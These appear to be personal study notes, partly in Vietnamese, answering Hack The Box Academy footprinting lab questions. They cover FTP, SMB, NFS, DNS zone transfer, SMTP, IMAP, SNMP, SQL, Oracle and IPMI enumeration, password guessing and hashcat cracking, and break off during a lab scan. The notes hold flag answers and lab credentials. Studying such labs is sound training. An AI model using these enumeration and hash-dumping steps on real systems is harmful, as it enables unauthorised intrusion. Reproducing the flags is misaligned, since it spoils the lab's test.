# **FTP**

## Target(s): 10.129.202.5 (ACADEMY-FOOT-NIX01)   

## 1. Which version of the FTP server is running on the target system? Submit the entire banner as the answer.

❯ ftp 10.129.202.5 21
Connected to 10.129.202.5.
220 **`InFreight FTP v1.1`** -> đáp án

## 2 Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.

Name (10.129.202.5:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (nopass)
230 Anonymous access granted, restrictions apply

ftp> get flag.txt
❯ cat flag.txt
**`HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}`** > đáp án

# SMB

### 1. What version of the SMB server is running on the target system? Submit the entire banner as the answer.
`ANS: Samba smbd 4.6.2` ? (dm thằng lol htb)
```zsh
❯ sudo nmap -sC -sV 10.129.202.5 -p 139,445
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 06:24 EDT
Nmap scan report for 10.129.202.5
Host is up (0.27s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

### 2. What is the name of the accessible share on the target?
`ANS: sambashare`
```zsh
❯ smbclient -N -L //10.129.202.5

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      InFreight SMB v3.1
        IPC$            IPC       IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
```
### 3. Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.
`ANS: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`
```zsh
❯ smbclient -N  //10.129.202.5/sambashare
ry "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  8 08:43:14 2021
  ..                                  D        0  Mon Nov  8 10:53:19 2021
  .profile                            H      807  Tue Feb 25 07:03:22 2020
  contents                            D        0  Mon Nov  8 08:43:45 2021
  .bash_logout                        H      220  Tue Feb 25 07:03:22 2020
  .bashrc                             H     3771  Tue Feb 25 07:03:22 2020

                5090944 blocks of size 1024. 1685520 blocks available
smb: \> cd contents
smb: \contents\> ls
  .                                   D        0  Mon Nov  8 08:43:45 2021
  ..                                  D        0  Mon Nov  8 08:43:14 2021
  flag.txt                            N       38  Mon Nov  8 08:43:45 2021
                5090944 blocks of size 1024. 1685516 blocks available
smb: \contents\> get flag.txt
❯ cat flag.txt
HTB{o873nz4xdo873n4zo873zn4fksuhldsf}
```

### 4. Find out which domain the server belongs to.
`ANS: DEVOPS`
```zsh
❯ enum4linux 10.129.202.5 -A
 ============================( Enumerating Workgroup/Domain on 10.129.202.5 )============================

[+] Got domain/workgroup name: DEVOPS
```

cách 2:
```zsh
❯ rpcclient -U "" 10.129.202.5
rpcclient $> querydominfo
Domain:         DEVOPS
Server:         DEVSMB
Comment:        InlaneFreight SMB server (Samba, Ubuntu)
Total Users:    0
Total Groups:   0
Total Aliases:  0
Sequence No:    1742897866
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```
### 5. Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.
`ANS: InFreight SMB v3.1`
```zsh
❯ smbclient -N -L //10.129.202.5

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      InFreight SMB v3.1
        IPC$            IPC       IPC Service (InlaneFreight SMB server (Samba, Ubuntu))

```
### 6. What is the full system path of that specific share? (format: "/directory/names")
`ANS: /home/sambauser`
```zsh
❯ rpcclient -U "" 10.129.202.5
rpcclient $> netshareenumall
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
netname: IPC$
        remark: IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
        path:   C:\tmp
        password:

```

```zsh
rpcclient $> netsharegetinfo sambashare
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

# NFS

```zsh
❯ mkdir mountedNFS
❯ sudo mount -t nfs 10.129.152.47:/ ./mountedNFS/ -o nolock
❯ cd mountedNFS
❯ cat /mnt/nfsshare/flag.txt
HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
❯ cd var
❯ tree
.
└── nfs
    └── flag.txt

2 directories, 1 file
❯ cd nfs
❯ cat flag.txt
HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
```

# DNS
1.
```zsh
❯ dig ns inlanefreight.htb @10.129.65.38 +short
ns.inlanefreight.htb.
```
2.
```zsh
❯ dig axfr internal.inlanefreight.htb @10.129.65.38 +short | grep "HTB{"
"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
```
3.
```zsh
❯ dig axfr internal.inlanefreight.htb @10.129.65.38 | awk '$4=="A" {sub(/\.$/, "", $1); print $5, $1}' | grep "dc1"
10.129.34.16 dc1.internal.inlanefreight.htb
```
4.
Check NS của từng thằng subdomains trong danh sách này
```zsh
❯ dig axfr inlanefreight.htb @10.129.65.38 | awk '$4=="A" {sub(/\.$/, "", $1); print $5, $1}' | grep -v "127.*"
10.129.18.15 app.inlanefreight.htb
10.12.0.1 dev.inlanefreight.htb
10.129.1.6 internal.inlanefreight.htb
10.129.18.201 mail1.inlanefreight.htb
```
Duy nhất thằng này có NS -> check thằng này trước
```zsh
❯ dig any dev.inlanefreight.htb @10.129.65.38 +short
inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
ns.inlanefreight.htb.
```

```zsh
❯ dnsenum --dnsserver 10.129.65.38 -p 0 -s 0 -f /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
Brute forcing with /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt:                                                                          
____________________________________________________________________________________                                                                         
                                                                                                                                                             
dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6                                                                                  
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203

```

# SMTP

1.
```zsh
❯ nc -nv 10.129.65.38 25
(UNKNOWN) [10.129.65.38] 25 (smtp) open

220 InFreight ESMTP v2.11
```
2.
```zsh
❯ smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.65.38 -w 10 -v | grep "exists"
10.129.65.38: robin exists
```

Cách trên dùng `smtp-user-enum` là tối ưu nhất, dùng `nmap` cho ra kết quả là không tìm thấy

Thử dùng `metasploit` cảm giác khá chậm
```zsh
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 > set RHOSTS 10.129.65.38
msf6 > set USER_FILE /home/kali/Desktop/learning/footprinting-wordlist.txt
msf6 > run
[*] 10.129.65.38:25       - 10.129.65.38:25 Banner: 220 InFreight ESMTP v2.11
[+] 10.129.65.38:25       - 10.129.65.38:25 Users found: robin
[*] 10.129.65.38:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# POP3(110,995)/ IMAP(143/993)

## 1. Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.

### ANS: organizationName=**`InlaneFreight Ltd`**

```zsh
❯ nmap -p 110,143,993,995 -T 5 --min-rate 4000 -sCV 10.129.38.26 -v
PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T23:10:05
| Not valid after:  2295-08-23T23:10:05
| MD5:   ef51:134e:59ff:6733:43f6:b8b2:1ba7:c081
|_SHA-1: c841:8247:2db5:6a25:33eb:8e2f:a6ca:4680:cede:8f68
|_pop3-capabilities: SASL STLS PIPELINING AUTH-RESP-CODE CAPA UIDL TOP RESP-CODES
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities listed STARTTLS more IMAP4rev1 post-login LOGIN-REFERRALS have SASL-IR IDLE Pre-login ID ENABLE LOGINDISABLEDA0001 LITERAL+ OK
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T23:10:05
| Not valid after:  2295-08-23T23:10:05
| MD5:   ef51:134e:59ff:6733:43f6:b8b2:1ba7:c081
|_SHA-1: c841:8247:2db5:6a25:33eb:8e2f:a6ca:4680:cede:8f68
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: AUTH=PLAINA0001 Pre-login more IMAP4rev1 post-login LOGIN-REFERRALS have SASL-IR IDLE listed ID capabilities ENABLE LITERAL+ OK
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T23:10:05
| Not valid after:  2295-08-23T23:10:05
| MD5:   ef51:134e:59ff:6733:43f6:b8b2:1ba7:c081
|_SHA-1: c841:8247:2db5:6a25:33eb:8e2f:a6ca:4680:cede:8f68
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T23:10:05
| Not valid after:  2295-08-23T23:10:05
| MD5:   ef51:134e:59ff:6733:43f6:b8b2:1ba7:c081
|_SHA-1: c841:8247:2db5:6a25:33eb:8e2f:a6ca:4680:cede:8f68
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE CAPA UIDL TOP RESP-CODES

NSE: Script Post-scanning.
Initiating NSE at 03:13
Completed NSE at 03:13, 0.00s elapsed
Initiating NSE at 03:13
Completed NSE at 03:13, 0.00s elapsed
Initiating NSE at 03:13
Completed NSE at 03:13, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
           Raw packets sent: 12 (480B) | Rcvd: 9 (352B)

```

## 2. What is the FQDN that the IMAP and POP3 servers are assigned to?
### ANS: commonName=**`dev.inlanefreight.htb`**

## 3. Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})
### ANS: **`HTB{roncfbw7iszerd7shni7jr2343zhrj}`**
```zsh
❯ openssl s_client -connect 10.129.38.26:imaps
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
```

## 4.What is the customized version of the POP3 server?
### ANS: **`InFreight POP3 v9.188`**
```zsh
❯ openssl s_client -connect 10.129.38.26:pop3s
+OK InFreight POP3 v9.188
```

## 5: From: CTO <devadmin@inlanefreight.htb>
## 6: HTB{983uzn8jmfgpd8jmof8c34n7zio}
```zsh
❯ openssl s_client -connect 10.129.38.26:imaps
1 LOGIN robin robin
1 LIST "" *
* LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." INBOX
a FETCH 1 (FLAGS BODY[HEADER.FIELDS (FROM SUBJECT DATE)] BODY[TEXT])
* 1 FETCH (FLAGS (\Seen) BODY[HEADER.FIELDS (FROM SUBJECT DATE)] {96}
Subject: Flag
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

 BODY[TEXT] {34}
HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
a OK Fetch completed (0.001 + 0.000 secs).

```

# SNMP
Cả bài chạy 1 lệnh duy nhất:
```zsh
❯ snmpbulkwalk -v2c -c public 10.129.38.26
```
1. Admin email
```zsh
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (661980) 1:50:19.80
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIX02"
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
```

2. customized version of the SNMP server
```zsh
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
```

3. Enumerate the custom script that is running on the system and submit its output as the answer.
```zsh
iso.3.6.1.2.1.25.1.7.1.3.1.1.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
iso.3.6.1.2.1.25.1.7.1.3.1.2.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
iso.3.6.1.2.1.25.1.7.1.3.1.3.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.4.4.70.76.65.71 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.4.1.2.4.70.76.65.71.1 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
```

# MySQL

1. Version
### ANS: **`MySQL 8.0.27`**
```zsh
❯ nmap -sCV 10.129.38.26 -p3306 -T 4 --min-rate 3000 -v
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ODBCClient, Speaks41ProtocolNew, ConnectWithDatabase, SupportsTransactions, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SwitchToSSLAfterHandshake, InteractiveClient, SupportsLoadDataLocal, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x13\x1BxF\x18P+]D\x0FWgL53V\x1A[{f
|_  Auth Plugin Name: caching_sha2_password

NSE: Script Post-scanning.
Initiating NSE at 05:31
Completed NSE at 05:31, 0.00s elapsed
Initiating NSE at 05:31
Completed NSE at 05:31, 0.00s elapsed
Initiating NSE at 05:31
Completed NSE at 05:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.67 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```

2. During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?
### ANS: ultrices@google.htb

```zsh
❯ mysql -u robin -probin -h 10.129.38.26
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
```

Nếu dính lỗi này thì thêm tùy chọn **`--ssl=0`**

```zsh
❯ mysql -u robin -probin -h 10.129.38.26 --ssl=0
```
```sql
MySQL [(none)]> select name, email from customers.myTable where name = "Otto Lang";
+-----------+---------------------+
| name      | email               |
+-----------+---------------------+
| Otto Lang | ultrices@google.htb |
+-----------+---------------------+
1 row in set (0.277 sec)
```


# MSSQL (1433,1434,2433)

1.  Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.
### ANS: **`ILF-SQL-01`**
```zsh
❯ nmap -p 1433,1434,2433 -T 4 --min-rate 3000 -sCV 10.129.230.249 -v
PORT     STATE  SERVICE    VERSION
1433/tcp open   ms-sql-s   Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.230.249\MSSQLSERVER: 
|     Target_Name: ILF-SQL-01
|     NetBIOS_Domain_Name: ILF-SQL-01
|     NetBIOS_Computer_Name: ILF-SQL-01
|     DNS_Domain_Name: ILF-SQL-01
|     DNS_Computer_Name: ILF-SQL-01
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.230.249\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.230.249\pipe\sql\query
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-28T10:06:24
| Not valid after:  2055-03-28T10:06:24
| MD5:   3da0:db48:af82:4956:03e2:65ad:78af:4d48
|_SHA-1: 4504:21b0:0ae5:f62a:064c:26af:c010:30c8:d0c3:c3cc
|_ssl-date: 2025-03-28T10:31:52+00:00; -2s from scanner time.
1434/tcp closed ms-sql-m
2433/tcp closed codasrv-se

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

NSE: Script Post-scanning.
Initiating NSE at 06:31
Completed NSE at 06:31, 0.00s elapsed
Initiating NSE at 06:31
Completed NSE at 06:31, 0.00s elapsed
Initiating NSE at 06:31
Completed NSE at 06:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (164B)

```


2.  Connect to the MSSQL instance running on the target using the account `(backdoor:Password1)`, then list the non-default database present on the server.
### ANS: **`Employees`**
```zsh
❯ impacket-mssqlclient backdoor:Password1@10.129.230.249 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ILF-SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(ILF-SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (ILF-SQL-01\backdoor  dbo@master)> 
```

```sql
SQL (ILF-SQL-01\backdoor  dbo@master)> select name from sys.databases
name        
---------   
master      

tempdb      

model       

msdb        

Employees   
```


# Oracle TNS (1521)

QUESTION: Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```zsh
❯ sudo nmap -sCV -T 4 --min-rate 3000 -p 1521 10.129.205.19 -v
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

```zsh
❯ odat sidguesser -s 10.129.205.19 -p 1521

[1] (10.129.205.19:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.205.19:1521 server
[+] 'XE' is a valid SID. Continue... #####################################################################################################  | ETA:  00:00:04 
100% |######################################################################################################################################| Time: 00:07:39 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |######################################################################################################################################| Time: 00:00:15 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid SID. Continue...                            #############################################################               | ETA:  00:00:44 
100% |######################################################################################################################################| Time: 00:06:43 
[+] SIDs found on the 10.129.205.19:1521 server: XE
```

```zsh
❯ sudo odat passwordguesser -s 10.129.205.19 -d XE -v
[sudo] password for kali: 
11:18:47 INFO -: CX_Oracle is well configured according to parameters

[1] (10.129.205.19:1521): Searching valid accounts on the 10.129.205.19 server, port 1521
11:18:47 INFO -: Loading accounts stored in the uniq file 'accounts/accounts.txt'
11:18:47 INFO -: Separator between login and password fixed on '/'
11:18:47 INFO -: 550 paired login/password loaded
11:18:47 INFO -: Searching valid accounts on 10.129.205.19:1521/sid:XE
The login abm has already been tested at least once. What do you want to do:                                                                | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                              | ETA:  00:23:01 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                              | ETA:  00:22:19 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                 | ETA:  00:21:37 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                  | ETA:  00:18:24 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                               | ETA:  00:14:19 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password####                                                      | ETA:  00:11:11 
[!] Notice: 'outln' account is locked, so skipping this username for password##############                                                 | ETA:  00:10:01 
11:41:05 INFO -: Impossible to execute the query 'SELECT platform_name FROM v$database': 'ORA-00942: table or view does not exist'          | ETA:  00:05:32 
11:41:05 INFO -: OS version from getDatabasePlatfromName(): IBMPC/WIN_NT64-9.1.0
11:41:05 INFO -: Valid credential: scott/tiger (scott/tiger@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=10.129.205.19)(Port=1521)))(CONNECT_DATA=(SID=XE))))  
[+] Valid credentials found: scott/tiger. Continue...           
[!] Notice: 'xdb' account is locked, so skipping this username for password###########################################################      | ETA:  00:01:06 100% |######################################################################################################################################| Time: 00:27:36 
[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger                                                                           

```

```zsh
❯ sqlplus scott/tiger@10.129.205.19/XE as sysdba
```
```sql
SQL> select name, password from sys.user$ where name = 'DBSNMP';

NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC
```


# IPMI

## Nmap
```zsh
❯ sudo nmap -sCVU -T 4 --min-rate 3000 -p 623 10.129.202.5 -v
PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.95%I=7%D=3/29%Time=67E7918F%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
```

## check version

```zsh
❯ sudo msfconsole -q
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.202.5
rhosts => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
[+] 10.129.202.5:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```zsh
msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > set RHOSTS 10.129.202.5
RHOSTS => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run
[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
[+] 10.129.202.5:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


### 1. ADMIN
```zsh
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.202.5
rhosts => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.202.5:623 - IPMI - Hash found: admin:97d1c2c98201000031bc6db8cfc67b797209b4dd0cbc28ced269b4f4d03b7b426896fa87a5cf9096a123456789abcdefa123456789abcdef140561646d696e:daa885de4466cd8e67f3df90b816f9a82b5807fc
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 2. **`trinity`**

```zsh
cat ipmi_hash.txt 
97d1c2c98201000031bc6db8cfc67b797209b4dd0cbc28ced269b4f4d03b7b426896fa87a5cf9096a123456789abcdefa123456789abcdef140561646d696e:daa885de4466cd8e67f3df90b816f9a82b5807fc
```

```zsh
hashcat -m 7300 -a 0 ipmi_hash.txt  rockyou.txt
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

97d1c2c98201000031bc6db8cfc67b797209b4dd0cbc28ced269b4f4d03b7b426896fa87a5cf9096a123456789abcdefa123456789abcdef140561646d696e:daa885de4466cd8e67f3df90b816f9a82b5807fc:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 97d1c2c98201000031bc6db8cfc67b797209b4dd0cbc28ced26...5807fc
Time.Started.....: Sat Mar 29 07:02:17 2025 (0 secs)
Time.Estimated...: Sat Mar 29 07:02:17 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14932 H/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344384 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany

Started: Sat Mar 29 07:01:32 2025
Stopped: Sat Mar 29 07:02:18 2025
```

```zsh
hashcat -m 7300 -a 0 ipmi_hash.txt  rockyou.txt --show
97d1c2c98201000031bc6db8cfc67b797209b4dd0cbc28ced269b4f4d03b7b426896fa87a5cf9096a123456789abcdefa123456789abcdef140561646d696e:daa885de4466cd8e67f3df90b816f9a82b5807fc:trinity
```


# Footprinting Lab - Easy

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials **`"ceil:qwer1234"`**, and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

## Phân tích
- Có các thông tin cần lưu ý: 
+ **The first server is an internal DNS server**
+ credentials **`"ceil:qwer1234"
+  employees were talking about SSH keys on a forum
+ The administrators have stored a `flag.txt` file on this server

## Khởi động

Trước hết cứ kệ mẹ sự đời, mình check qua `nmap` cái đã :v

Tranh thủ thêm vào `/etc/hosts` cho dễ
```zsh
❯ echo "10.129.156.26   inlanefreight.htb" | sudo tee -a /etc/hosts
10.129.156.26   inlanefreight.htb
```

```zsh
❯ sudo nmap -sS -p- -T 4 --min-rate 3000 10.129.156.26
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 04:53 EDT
Warning: 10.129.156.26 giving up on port because retransmission cap hit (6).
Nmap scan report for inlanefreight.htb (10.129.156.26)
Host is up (0.28s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
53/tcp    open     domain
2121/tcp  open     ccproxy-ftp
14463/tcp filtered unknown
16349/tcp filtered unknown
25133/tcp filtered unknown
35474/tcp filtered unknown
63429/tcp filtered unknown
```

Giờ thì có 2 hướng, một là dùng `--source-port 53` check nốt mấy thằng filtered kia xem có gì không, hai là vào thẳng `ftp` luôn. Hãy làm cả 2 cùng lúc.

```zsh
❯ sudo nmap -sV -p14463,16349,25133,35474,63429 --source-port 53 -D RND:5 -e tun0  10.129.156.26
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 05:19 EDT
Nmap scan report for inlanefreight.htb (10.129.156.26)
Host is up (0.27s latency).
